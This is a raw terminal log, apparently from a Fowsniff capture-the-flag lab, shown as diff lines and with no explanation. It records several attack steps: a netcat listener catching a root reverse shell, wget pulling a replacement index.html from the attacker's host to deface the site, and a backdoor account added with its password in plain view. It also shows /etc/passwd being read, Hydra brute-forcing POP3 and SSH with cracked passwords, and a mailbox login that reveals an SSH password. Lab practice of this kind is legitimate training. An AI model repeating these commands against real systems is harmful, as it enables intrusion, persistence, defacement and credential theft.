@@ -1,0 +1,1003 @@
+TRANSFERRING THE HTML FILE
+
+
+┌──(zetayota㉿Sophy)-[~]
+└─$ wget 10.10.109.224:80/index.html                                                                        
+Prepended http:// to '10.10.109.224:80/index.html'
+--2025-03-28 11:17:08--  http://10.10.109.224/index.html
+Connecting to 10.10.109.224:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2629 (2.6K) [text/html]
+Saving to: ‘index.html’
+
+index.html                           100%[===================================================================>]   2.57K  --.-KB/s    in 0s      
+
+2025-03-28 11:17:09 (381 MB/s) - ‘index.html’ saved [2629/2629]
+
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~]
+└─$ nano index.html            
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~]
+└─$ python3 -m http.server 8080     
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.109.224 - - [28/Mar/2025 11:22:44] "GET /index.html HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~]
+
+
+
+
+
+
+
+
+SETTING UP AND ACCESSING THE LISTENING PORT
+
+┌──(zetayota㉿Sophy)-[~]
+└─$ nc -nvlp 1234              
+listening on [any] 1234 ...
+connect to [10.9.1.111] from (UNKNOWN) [10.10.109.224] 51556
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+# cd root
+# ls
+Maildir
+flag.txt
+# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&&&&&&&&&&&&&&|
+  |    R O O T   |
+  |    F L A G   |
+  |&&&&&&&&&&&&&&|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+
+# cd /var/www
+# ls
+html
+# cd html
+# ls
+LICENSE.txt
+README.txt
+assets
+images
+index.html
+robots.txt
+security.txt
+# nano index.html
+Error opening terminal: unknown.
+# cat index.html
+<!DOCTYPE HTML>
+<!--
+        Escape Velocity by HTML5 UP
+        html5up.net | @ajlkn
+        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+        <head>
+                <title>Fowsniff Corp - Delivering Solutions</title>
+
+                <meta charset="utf-8" />
+                <meta name="viewport" content="width=device-width, initial-scale=1" />
+                <!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+                <link rel="stylesheet" href="assets/css/main.css" />
+                <!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+        </head>
+        <body class="no-sidebar">
+                <div id="page-wrapper">
+
+                        <!-- Header -->
+                                <div id="header-wrapper" class="wrapper">
+                                        <div id="header">
+
+                                                <!-- Logo -->
+                                                        <div id="logo">
+                                                                <h1><a href="#">Fowsniff Corp.</a></h1>
+                                                                <p>Delivering Solutions</p>
+                                                        </div>
+
+                                        </div>
+                                </div>
+
+                        <!-- Main -->
+                                <div class="wrapper style2">
+                                        <div id="main" class="container">
+
+                                                <!-- Content -->
+                                                        <div id="content">
+                                                                <article class="box post">
+                                                                        <header class="style1">
+                                                                                <h2>Our Website is Temporarily Out of Service.</h2>
+                                                                                <p>We apologize for the inconvenience.</p>
+                                                                        </header>
+                                                                        <a href="#" class="image featured">
+                                                                                <img src="images/pic01.jpg" alt="" />
+                                                                        </a>
+                                                                        <p>Fowsniff's internal system suffered a data breach that
+                                                                        resulted in the exposure of employee usernames and passwords.</p>
+
+                                                                        <p><strong>Client information was not affected.</strong></p>
+
+                                                                        <p>Due to the strong possibility that employee information has
+                                                                        been  made publicly available, all employees have been
+                                                                  instructed to change their passwords immediately.</p>
+
+                                                                        <p>The attackers were also able to hijack our official @fowsniffcorp Twitter account.
+                                                                        All of our official tweets have been deleted and the attackers
+                                                                        may release sensitive information via this medium. We are
+                                                                        working to resolve this at soon as possible.</p>
+
+                                                                        <p>We will return to full capacity after a service upgrade.</p>
+                                                                </article>
+
+
+                <!-- Scripts -->
+
+                        <script src="assets/js/jquery.min.js"></script>
+                        <script src="assets/js/jquery.dropotron.min.js"></script>
+                        <script src="assets/js/skel.min.js"></script>
+                        <script src="assets/js/skel-viewport.min.js"></script>
+                        <script src="assets/js/util.js"></script>
+                        <!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+                        <script src="assets/js/main.js"></script>
+
+        </body>
+</html>
+# python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@fowsniff:/var/www/html# nano index.html
+nano index.html
+Error opening terminal: unknown.
+root@fowsniff:/var/www/html# wget 
+wget
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+root@fowsniff:/var/www/html# rm index.html
+rm index.html
+root@fowsniff:/var/www/html# ls
+ls
+LICENSE.txt  README.txt  assets  images  robots.txt  security.txt
+root@fowsniff:/var/www/html# wget 10.9.1.111:8080/index.html
+wget 10.9.1.111:8080/index.html
+--2025-03-28 11:22:44--  http://10.9.1.111:8080/index.html
+Connecting to 10.9.1.111:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2612 (2.6K) [text/html]
+Saving to: 'index.html'
+
+index.html          100%[===================>]   2.55K  --.-KB/s    in 0.02s   
+
+2025-03-28 11:22:44 (107 KB/s) - 'index.html' saved [2612/2612]
+
+root@fowsniff:/var/www/html# sudo adduser kirin   
+sudo adduser kirin
+Adding user `kirin' ...
+Adding new group `kirin' (1009) ...
+Adding new user `kirin' (1009) with group `kirin' ...
+Creating home directory `/home/kirin' ...
+Copying files from `/etc/skel' ...
+Enter new UNIX password: lmtech
+
+Retype new UNIX password: lmtech
+
+passwd: password updated successfully
+Changing the user information for kirin
+Enter the new value, or press ENTER for the default
+        Full Name []: 
+
+
+        Room Number []: 
+        Work Phone []: 
+
+        Home Phone []: 
+
+        Other []: 
+
+
+Is the information correct? [Y/n] 
+
+root@fowsniff:/var/www/html# 
+root@fowsniff:/var/www/html# 
+
+root@fowsniff:/var/www/html# groups root
+groups root
+root : root
+root@fowsniff:/var/www/html# cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+postfix:x:108:115::/var/spool/postfix:/bin/false
+dovecot:x:109:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:110:118:Dovecot login user,,,:/nonexistent:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
+parede:x:1001:100::/home/parede:/bin/bash
+mauer:x:1002:100::/home/mauer:/bin/bash
+sciana:x:1003:100::/home/sciana:/bin/bash
+baksteen:x:1004:100::/home/baksteen:/bin/bash
+mursten:x:1005:100::/home/mursten:/bin/bash
+tegel:x:1006:100::/home/tegel:/bin/bash
+seina:x:1007:100::/home/seina:/bin/bash
+mustikka:x:1008:100::/home/mustikka:/bin/bash
+kirin:x:1009:1009:,,,:/home/kirin:/bin/bash
+root@fowsniff:/var/www/html# groups stone
+groups stone
+stone : stone adm cdrom sudo dip plugdev users lpadmin sambashare
+root@fowsniff:/var/www/html#   
+
+
+
+
+
+
+
+
+accessing the fowsniff server
+
+┌──(zetayota㉿Sophy)-[~]
+└─$ mkdir fowsniff_all        
+                                                             
+┌──(zetayota㉿Sophy)-[~]
+└─$ cd fowsniff_all 
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ nano users.txt             
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ nano pass.txt 
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ nano paswords.txt
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ cat pass.txt   
+8a28a94a588a95b80163709ab4313aa4
+ae1644dac5b77c0cf51e0d26ad6d7e56
+1dc352435fecca338acfd4be10984009
+19f5af754c31f1e2651edde9250d69bb
+90dc16d47114aa13671c697fd506cf26
+a92b8a29ef1183192e3d35187e0cfabd
+0e9588cb62f4b6f27e33d449e2ba0b3b
+4d6e42f56e127803285a0a7649b5ab11
+f7fd98d380735e859f8b2ffbbede5a7e
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ cat passwords.txt
+cat: passwords.txt: No such file or directory
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ cat paswords.txt 
+mailcall
+bilbo101
+apples01
+skyler22
+scoobydoo2
+Not found.
+carp4ever
+orlando12
+07011972
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ hydra --help                                        
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+hydra: invalid option -- '-'
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ hydra -help 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r        use a non-random shuffling method for option -x
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp ncp oracle sapr3 smb2.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+                                                             
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ hydra -L users.txt -P paswords.txt 10.10.109.224 pop3 -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-28 10:17:50
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task
+[DATA] attacking pop3://10.10.109.224:110/
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "mailcall" - 1 of 81 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "bilbo101" - 2 of 81 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "apples01" - 3 of 81 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "skyler22" - 4 of 81 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "scoobydoo2" - 5 of 81 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "Not found." - 6 of 81 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "carp4ever" - 7 of 81 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "orlando12" - 8 of 81 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "07011972" - 9 of 81 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "mailcall" - 10 of 81 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "bilbo101" - 11 of 81 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "apples01" - 12 of 81 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "skyler22" - 13 of 81 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "scoobydoo2" - 14 of 81 [child 13] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "Not found." - 15 of 81 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "carp4ever" - 16 of 81 [child 15] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "orlando12" - 17 of 81 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "07011972" - 18 of 81 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "mailcall" - 19 of 81 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "bilbo101" - 20 of 81 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "apples01" - 21 of 81 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "skyler22" - 22 of 81 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "scoobydoo2" - 23 of 81 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "Not found." - 24 of 81 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "carp4ever" - 25 of 81 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "orlando12" - 26 of 81 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "tegel" - pass "07011972" - 27 of 81 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "mailcall" - 28 of 81 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "bilbo101" - 29 of 81 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "apples01" - 30 of 81 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "skyler22" - 31 of 81 [child 13] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "scoobydoo2" - 32 of 81 [child 15] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "Not found." - 33 of 81 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "carp4ever" - 34 of 81 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "orlando12" - 35 of 81 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "baksteen" - pass "07011972" - 36 of 81 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "mailcall" - 37 of 81 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "bilbo101" - 38 of 81 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "apples01" - 39 of 81 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "skyler22" - 40 of 81 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "scoobydoo2" - 41 of 81 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "Not found." - 42 of 81 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "carp4ever" - 43 of 81 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "orlando12" - 44 of 81 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "seina" - pass "07011972" - 45 of 81 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "mailcall" - 46 of 81 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "bilbo101" - 47 of 81 [child 13] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "apples01" - 48 of 81 [child 15] (0/0)
+[110][pop3] host: 10.10.109.224   login: seina   password: scoobydoo2
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "skyler22" - 49 of 81 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "scoobydoo2" - 50 of 81 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "Not found." - 51 of 81 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "carp4ever" - 52 of 81 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "orlando12" - 53 of 81 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "stone" - pass "07011972" - 54 of 81 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "mailcall" - 55 of 81 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "bilbo101" - 56 of 81 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "apples01" - 57 of 81 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "skyler22" - 58 of 81 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "scoobydoo2" - 59 of 81 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "Not found." - 60 of 81 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "carp4ever" - 61 of 81 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "orlando12" - 62 of 81 [child 13] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mursten" - pass "07011972" - 63 of 81 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "mailcall" - 64 of 81 [child 15] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "bilbo101" - 65 of 81 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "apples01" - 66 of 81 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "skyler22" - 67 of 81 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "scoobydoo2" - 68 of 81 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "Not found." - 69 of 81 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "carp4ever" - 70 of 81 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "orlando12" - 71 of 81 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "parede" - pass "07011972" - 72 of 81 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "mailcall" - 73 of 81 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "bilbo101" - 74 of 81 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "apples01" - 75 of 81 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "skyler22" - 76 of 81 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "scoobydoo2" - 77 of 81 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "Not found." - 78 of 81 [child 13] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "carp4ever" - 79 of 81 [child 14] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "sciana" - pass "orlando12" - 80 of 81 [child 15] (0/0)
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ nc 10.10.109.224 110
++OK Welcome to the Fowsniff Corporate Mail Server!
+user seina
++OK
+pass scoobydoo2
++OK Logged in.
+list
++OK 2 messages:
+1 1622
+2 1280
+.
+RETR 1
++OK 1622 octets
+Return-Path: <stone@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1000)
+        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
+    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
+    tegel@fowsniff
+Subject: URGENT! Security EVENT!
+Message-Id: <20180313185107.0FA3916A@fowsniff>
+Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
+From: stone@fowsniff (stone)
+
+Dear All,
+
+A few days ago, a malicious actor was able to gain entry to
+our internal email systems. The attacker was able to exploit
+incorrectly filtered escape characters within our SQL database
+to access our login credentials. Both the SQL and authentication
+system used legacy methods that had not been updated in some time.
+
+We have been instructed to perform a complete internal system
+overhaul. While the main systems are "in the shop," we have
+moved to this isolated, temporary server that has minimal
+functionality.
+
+This server is capable of sending and receiving emails, but only
+locally. That means you can only send emails to other users, not
+to the world wide web. You can, however, access this system via 
+the SSH protocol.
+
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+
+You MUST change this password as soon as possible, and you will do so under my
+guidance. I saw the leak the attacker posted online, and I must say that your
+passwords were not very secure.
+
+Come see me in my office at your earliest convenience and we'll set it up.
+
+Thanks,
+A.J Stone
+
+
+.
+RETR 2
++OK 1280 octets
+Return-Path: <baksteen@fowsniff>
+X-Original-To: seina@fowsniff
+Delivered-To: seina@fowsniff
+Received: by fowsniff (Postfix, from userid 1004)
+        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+To: seina@fowsniff
+Subject: You missed out!
+Message-Id: <20180313185405.101CA1AC2@fowsniff>
+Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
+From: baksteen@fowsniff
+
+Devin,
+
+You should have seen the brass lay into AJ today!
+We are going to be talking about this one for a looooong time hahaha.
+Who knew the regional manager had been in the navy? She was swearing like a sailor!
+
+I don't know what kind of pneumonia or something you brought back with
+you from your camping trip, but I think I'm coming down with it myself.
+How long have you been gone - a week?
+Next time you're going to get sick and miss the managerial blowout of the century,
+at least keep it to yourself!
+
+I'm going to head home early and eat some chicken soup. 
+I think I just got an email from Stone, too, but it's probably just some
+"Let me explain the tone of my meeting with management" face-saving mail.
+I'll read it when I get back.
+
+Feel better,
+
+Skyler
+
+PS: Make sure you change your email password. 
+AJ had been telling us to do that right before Captain Profanity showed up.
+
+.
+^C
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ nano paswords.txt   
+                                                                                                                                                 
+┌──(zetayota㉿Sophy)-[~/fowsniff_all]
+└─$ hydra -L users.txt -P paswords.txt 10.10.109.224 ssh -V 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-28 10:32:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:9/p:10), ~6 tries per task
+[DATA] attacking ssh://10.10.109.224:22/
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "mailcall" - 1 of 90 [child 0] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "bilbo101" - 2 of 90 [child 1] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "apples01" - 3 of 90 [child 2] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "skyler22" - 4 of 90 [child 3] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "scoobydoo2" - 5 of 90 [child 4] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "Not found." - 6 of 90 [child 5] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "carp4ever" - 7 of 90 [child 6] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "orlando12" - 8 of 90 [child 7] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "07011972" - 9 of 90 [child 8] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mauer" - pass "S1ck3nBluff+secureshell" - 10 of 90 [child 9] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "mailcall" - 11 of 90 [child 10] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "bilbo101" - 12 of 90 [child 11] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "apples01" - 13 of 90 [child 12] (0/0)
+[ATTEMPT] target 10.10.109.224 - login "mustikka" - pass "skyler22" - 14 of 90 [child 13] (0/0)
